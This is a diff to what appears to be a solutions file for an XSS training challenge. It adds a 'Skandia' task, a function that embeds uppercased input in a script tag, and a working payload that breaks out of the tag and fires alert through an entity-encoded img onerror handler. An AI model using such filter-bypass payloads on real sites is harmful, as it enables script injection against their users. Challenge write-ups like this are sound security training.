@@ -85,3 +85,20 @@ function escape(s) {
 ```
 [[x|http://onerror=javascript:alert(1)//]]
 ```
+
+
+### Skandia
+
+- Task
+
+```
+function escape(s) {
+  return '<script>console.log("' + s.toUpperCase() + '")</script>';
+}
+```
+
+- Solution
+
+```
+</script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+```
